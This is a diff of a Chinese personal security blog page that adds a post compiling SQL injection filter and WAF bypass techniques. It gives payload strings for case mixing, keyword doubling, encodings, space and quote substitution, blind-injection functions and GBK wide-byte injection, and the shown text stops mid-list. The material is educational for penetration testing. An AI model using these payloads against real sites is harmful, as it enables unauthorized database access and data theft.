@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="index,follow">
-    
   
   <!-- 渲染优化 -->
   <meta name="renderer" content="webkit">
@@ -18,7 +16,9 @@
 
   <!-- 页面元数据 -->
   
-  <title>Archive - 小胡不甘平凡</title>
+  <title>SQL注入绕过知识汇总 - 小胡不甘平凡</title>
+  
+    <meta name="keywords" content="渗透测试,sql注入,绕过">
   
 
   
@@ -639,7 +639,7 @@
 
   
   
-      <div class='cover-wrapper  featured' style="display: none;">
+      <div class='cover-wrapper post featured' style="display: none;">
         <canvas id="header_canvas" style="position:absolute;bottom:0;z-index: 1;" width="900" height="350"></canvas>
         
           <div class='cover-backstretch'></div>
@@ -718,8 +718,8 @@
 
 
 <div id="pjax-data" style="display: none">
-  <div id="pjax-ispage">false</div>
-  <div id="pjax-pageTitle"></div>
+  <div id="pjax-ispage">true</div>
+  <div id="pjax-pageTitle">SQL注入绕过知识汇总</div>
   <div id="pjax-enable-cover">true</div>
   <div id="pjax-comment-path"></div>
   <div id="pjax-comment-placeholder"></div>
@@ -978,7 +978,7 @@
         <div class="webinfo-item">
           <div>最后活动时间：</div>
           
-            <div id="last-update" style="display: none;">Sun Dec 12 2021 23:24:44 GMT+0800 (中国标准时间)</div>
+            <div id="last-update" style="display: none;">Sun Dec 12 2021 23:24:43 GMT+0800 (中国标准时间)</div>
             <div id="last-update-show">2021-12-12 日</div>
           
         </div>
@@ -1040,445 +1040,320 @@
 
   
 
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow floatable desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fal fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">1.大小写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">2.双写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%B8%B8%E7%94%A8%E6%B3%A8%E9%87%8A%E7%AC%A6%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-text">3.常用注释符进行绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">4.编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="toc-text">5.绕过空格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87%EF%BC%88%E4%BD%BF%E7%94%A8%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%EF%BC%89"><span class="toc-text">6.引号绕过（使用十六进制）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">7.逗号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">8.比较符号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-or-and-xor-not%E7%BB%95%E8%BF%87"><span class="toc-text">9.or and xor not绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-%E7%BB%95%E8%BF%87"><span class="toc-text">9.&#x3D;绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-text">10.等价函数绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-%E7%AD%89%E4%BB%B7%E8%AF%AD%E5%8F%A5"><span class="toc-text">11.等价语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">12.宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13-%E5%A4%9A%E5%8F%82%E6%95%B0%E8%AF%B7%E6%B1%82%E6%8B%86%E5%88%86"><span class="toc-text">13.多参数请求拆分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#14-%E7%94%9F%E5%83%BB%E5%87%BD%E6%95%B0"><span class="toc-text">14.生僻函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#15-%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">15.反引号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#16-N%E7%BB%95%E8%BF%87"><span class="toc-text">16. \N绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#17-php%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84waf%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="toc-text">17.php中常见的waf及绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4and-or"><span class="toc-text">过滤and or</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4union"><span class="toc-text">过滤union</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4where"><span class="toc-text">过滤where</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4limit"><span class="toc-text">过滤limit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4group-by"><span class="toc-text">过滤group by</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4select"><span class="toc-text">过滤select</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E2%80%99-%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-text">过滤’(单引号)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4hex"><span class="toc-text">过滤hex</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4substr"><span class="toc-text">过滤substr</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#18-%E6%9B%B4%E6%94%B9%E6%B3%A8%E5%85%A5%E5%8F%82%E6%95%B0%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F"><span class="toc-text">18.更改注入参数传参方式</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
 
 </aside>
 
 <div class='l_main'>
-	
-	  <article id="arc" class="post article white-box reveal shadow floatable">
-		<h2><i class="fas fa-book-open"></i>&nbsp;时间轴</h2>
-			
-			
-				
-				
-					
-						
-						<h3>2021</h3>
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/12/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">
-									<time>12-11</time>
-									
-										SQL注入绕过知识汇总
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/11/29/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5sql-labs%20%E7%AC%AC%E4%BA%94%E5%85%B3/">
-									<time>11-29</time>
-									
-										sqli-labs第五关二次注入
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/11/15/AWD%E8%B5%9B%E5%89%8D%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-									<time>11-15</time>
-									
-										AWD赛前学习笔记
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/07/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99%E5%B7%A5%E5%85%B7/">
-									<time>07-22</time>
-									
-										信息收集网站工具总结
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/03/25/Mysql%E9%9D%A2%E8%AF%95%E9%A2%98/">
-									<time>03-25</time>
-									
-										Mysql常见面试题
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/03/22/%E7%AD%89%E4%BF%9D%E4%BB%A5%E5%8F%8AISO27001/">
-									<time>03-22</time>
-									
-										等保以及ISO27001
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/03/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E9%98%B2%E8%8C%83/">
-									<time>03-16</time>
-									
-										常见漏洞原理及防范
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E6%80%BB%E7%BB%93/">
-									<time>02-26</time>
-									
-										渗透测试过程总结
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/02/12/lambda/">
-									<time>02-12</time>
-									
-										浅谈Lambda表达式
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/02/10/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/">
-									<time>02-10</time>
-									
-										JAVA代理方式
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/02/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%9D%A2%E8%AF%95%E9%A2%98/">
-									<time>02-05</time>
-									
-										JAVA多线程面试题
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/02/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">
-									<time>02-05</time>
-									
-										JAVA多线程知识点总结
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/01/25/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B01/">
-									<time>01-25</time>
-									
-										白帽子讲Web安全笔记1
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/01/18/OWASP%20Top10/">
-									<time>01-18</time>
-									
-										OWASP TOP10介绍
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/01/12/%E8%AF%A6%E8%B0%88java%E5%86%85%E9%83%A8%E7%B1%BB/">
-									<time>01-12</time>
-									
-										详谈JAVA内部类
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/01/02/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E9%83%A8%E5%88%86/">
-									<time>01-02</time>
-									
-										JAVA基础知识回顾
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						
-						<h3>2019</h3>
-					
-						<div class='timenode'>
-								<a class="meta" href="/2019/09/22/%E7%A7%BB%E4%BD%8D%E5%8F%98%E6%8D%A2%E5%92%8C%E4%BB%BF%E5%B0%84%E5%8F%98%E6%8D%A2/">
-									<time>09-22</time>
-									
-										移位变换和仿射变换
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2019/09/04/%E7%BD%91%E8%A7%84%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/">
-									<time>09-04</time>
-									
-										网规笔记（二）
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2019/09/03/NF%E7%AC%94%E8%AE%B0/">
-									<time>09-03</time>
-									
-										NF学习笔记
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2019/09/03/%E7%BD%91%E8%A7%84%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">
-									<time>09-03</time>
-									
-										网规笔记（一）
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						
-						<h3>2018</h3>
-					
-						<div class='timenode'>
-								<a class="meta" href="/2018/12/18/java%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/">
-									<time>12-18</time>
-									
-										java文件处理
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2018/12/17/%E8%BF%B7%E5%A4%B1/">
-									<time>12-17</time>
-									
-										迷失
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2018/11/23/%E6%9D%AD%E7%94%B5OJ2000-2010%E8%A7%A3%E7%AD%94/">
-									<time>11-23</time>
-									
-										杭电OJ2000-2010java解答
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2018/11/10/Collection%E5%92%8CIterator%E6%8E%A5%E5%8F%A3/">
-									<time>11-10</time>
-									
-										Collection和Iterator接口
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2018/11/10/java-for%E5%BE%AA%E7%8E%AF%E7%9A%84%E7%94%A8%E6%B3%95/">
-									<time>11-10</time>
-									
-										java for循环的用法
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2018/10/26/About-My-Blog/">
-									<time>10-26</time>
-									
-										 欢迎回家
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-	  </article>
-	
+  <article
+  class="article post white-box reveal md shadow floatable article-type-post"
+  id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        SQL注入绕过知识汇总
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="https://cdn.jsdelivr.net/gh/epoch1/CDN@1.0/images/avatar.jpeg">
+    <p>小胡</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fal fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fal fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Dec 11, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="SQL注入绕过知识汇总" data-path="/2021/12/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">
+        <i class="fal fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+
+  
+  <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>学习SQL注入也有很长一段时间了，在实战中，往往最难的不是SQL注入的使用方法，而是应该怎么绕过针对于防止SQL注入攻击的过滤，于是想总结一下一些比较常见的SQL注入的绕过方式。</p>
+<h4 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1.大小写绕过"></a>1.大小写绕过</h4><p>如果网站没有对大小写都进行过滤的话，可以尝试进行大小写绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 UnIon SeLeCt user()--+</span><br></pre></td></tr></table></figure>
+<h4 id="2-双写绕过"><a href="#2-双写绕过" class="headerlink" title="2.双写绕过"></a>2.双写绕过</h4><p>有一些网站会将SQL关键字进行替换操作，在出现SQL关键字（比如select,union等）时，将其替换为空，这时候就可以进行双写绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 ununionion seselectlect user()--+</span><br></pre></td></tr></table></figure>
+<h4 id="3-常用注释符进行绕过"><a href="#3-常用注释符进行绕过" class="headerlink" title="3.常用注释符进行绕过"></a>3.常用注释符进行绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;</span><br><span class="line">--%20</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">#</span><br><span class="line">--+</span><br><span class="line">-- -</span><br><span class="line">%00</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
+<h4 id="4-编码绕过"><a href="#4-编码绕过" class="headerlink" title="4.编码绕过"></a>4.编码绕过</h4><p>可以利用urlencode，ascii(char)，hex，unicode等编码来进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">or 1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span><br><span class="line"></span><br><span class="line">十六进制编码</span><br><span class="line"></span><br><span class="line">SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</span><br><span class="line"></span><br><span class="line">双重编码绕过</span><br><span class="line"></span><br><span class="line">?id&#x3D;1%252f%252a*&#x2F;UNION%252f%252a &#x2F;SELECT%252f%252a*&#x2F;1,2,password%252f%252a*&#x2F;FROM%252f%252a*&#x2F;Users--+</span><br><span class="line"></span><br><span class="line">一些unicode编码举例：    </span><br><span class="line">单引号：&#39;</span><br><span class="line">%u0027 %u02b9 %u02bc</span><br><span class="line">%u02c8 %u2032</span><br><span class="line">%uff07 %c0%27</span><br><span class="line">%c0%a7 %e0%80%a7</span><br><span class="line">空白：</span><br><span class="line">%u0020 %uff00</span><br><span class="line">%c0%20 %c0%a0 %e0%80%a0</span><br><span class="line">左括号(:</span><br><span class="line">%u0028 %uff08</span><br><span class="line">%c0%28 %c0%a8</span><br><span class="line">%e0%80%a8</span><br><span class="line">右括号):</span><br><span class="line">%u0029 %uff09</span><br><span class="line">%c0%29 %c0%a9</span><br><span class="line">%e0%80%a9</span><br></pre></td></tr></table></figure>
+<h4 id="5-绕过空格"><a href="#5-绕过空格" class="headerlink" title="5.绕过空格"></a>5.绕过空格</h4><p>两个空格可以代替一个空格，用Tab代替空格，%a0=空格</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F;  &#x2F;*!*&#x2F;</span><br></pre></td></tr></table></figure>
+<p>如果只对空格进行过滤，没有对括号进行过滤，可以使用括号绕过空格。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(user())from dual where(1&#x3D;1)and(2&#x3D;2)</span><br></pre></td></tr></table></figure>
+<p>这种方法常用于基于时间的盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</span><br></pre></td></tr></table></figure>
+<h4 id="6-引号绕过（使用十六进制）"><a href="#6-引号绕过（使用十六进制）" class="headerlink" title="6.引号绕过（使用十六进制）"></a>6.引号绕过（使用十六进制）</h4><p>一般会用到引号的地方是在最后的where子句中。如下面的一条sql语句，这条语句就是简单的用来查询user表中所有字段的语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.tables where table_name&#x3D;&quot;users&quot;</span><br></pre></td></tr></table></figure>
+<p>如果这个时候引号被过滤了，那么上面的语句就无法正常执行，遇到这种情况可以使用十六进制来解决问题。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.tables where table_name&#x3D;0x7573657273</span><br></pre></td></tr></table></figure>
+<h4 id="7-逗号绕过"><a href="#7-逗号绕过" class="headerlink" title="7.逗号绕过"></a>7.逗号绕过</h4><p>在使用盲注的时候，很多都要使用到substr(),mid(),limit。这些函数都需要配合逗号使用，在遇到对逗号进行过滤的情况下，可以使用from to进行绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
+<p>使用join</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2     #等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>
+<p>使用like</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))&#x3D;80   #等价于</span><br><span class="line">select user() like &#39;r%&#39;</span><br></pre></td></tr></table></figure>
+<p>使用limit可以用offset进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1 #等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>
+<h4 id="8-比较符号绕过"><a href="#8-比较符号绕过" class="headerlink" title="8.比较符号绕过"></a>8.比较符号绕过</h4><p>sqlmap经常使用&gt;&lt;，使用between的脚本。可以使用greatest()，least()，进行绕过，如果在使用ascii码二分法对数据库进行拆解时无法使用比较符号，就可以使用以上两个函数进行绕过。</p>
+<p>常见的一个盲注sql语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>如果此时比较操作符被过滤，上面的盲注语句则无法生效，我没可以通过greatest()函数来进行绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</span><br></pre></td></tr></table></figure>
+<h4 id="9-or-and-xor-not绕过"><a href="#9-or-and-xor-not绕过" class="headerlink" title="9.or and xor not绕过"></a>9.or and xor not绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and&#x3D;&amp;&amp;  or&#x3D;||   xor&#x3D;|   not&#x3D;!</span><br></pre></td></tr></table></figure>
+<h4 id="9-绕过"><a href="#9-绕过" class="headerlink" title="9.=绕过"></a>9.=绕过</h4><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;，或者以下语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</span><br></pre></td></tr></table></figure>
+<h4 id="10-等价函数绕过"><a href="#10-等价函数绕过" class="headerlink" title="10.等价函数绕过"></a>10.等价函数绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() &#x3D;&#x3D;&gt; ascii()</span><br><span class="line"></span><br><span class="line">sleep() &#x3D;&#x3D;&gt;benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()&#x3D;&#x3D;&gt;group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() &#x3D;&#x3D;&gt; substring()</span><br><span class="line"></span><br><span class="line">@@user &#x3D;&#x3D;&gt; user()</span><br><span class="line"></span><br><span class="line">@@datadir &#x3D;&#x3D;&gt; datadir()</span><br><span class="line"></span><br><span class="line">举例：substring()和substr()无法使用时：?id&#x3D;1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))&#x3D;74　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((select &#39;password&#39;),1,1) &#x3D; 0x70</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x69) &#x3D; 1</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x70) &#x3D; 0</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x71) &#x3D; -1</span><br></pre></td></tr></table></figure>
+<h4 id="11-等价语句"><a href="#11-等价语句" class="headerlink" title="11.等价语句"></a>11.等价语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select &#x3D;&#x3D;&gt; show</span><br><span class="line"></span><br><span class="line">#HANDLER语法</span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,…) [ WHERE where_condition ] [LIMIT … ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT … ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT … ]</span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line">#set语法</span><br><span class="line">mysql&gt; set @varA &#x3D; 3, @varB &#x3D; @varA;</span><br><span class="line">mysql&gt; select @varB;</span><br></pre></td></tr></table></figure>
+<h4 id="12-宽字节注入"><a href="#12-宽字节注入" class="headerlink" title="12.宽字节注入"></a>12.宽字节注入</h4><p>过滤 ’ 的时候往往利用的思路是将 ’ 转换为 ’ 。<br>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：<br>（1）%df 吃掉 \ 具体的方法是 urlencode(’) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+<p>（2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。一般产生宽字节注入的PHP函数：<br>1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \ 转为 \，将 “ 转为 “ 。用思路一。<br>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一（防御此漏洞，要将 mysql_query 设置为 binary 的方式）<br>3.mysql_real_escape_string()：转义下列字符：</p>
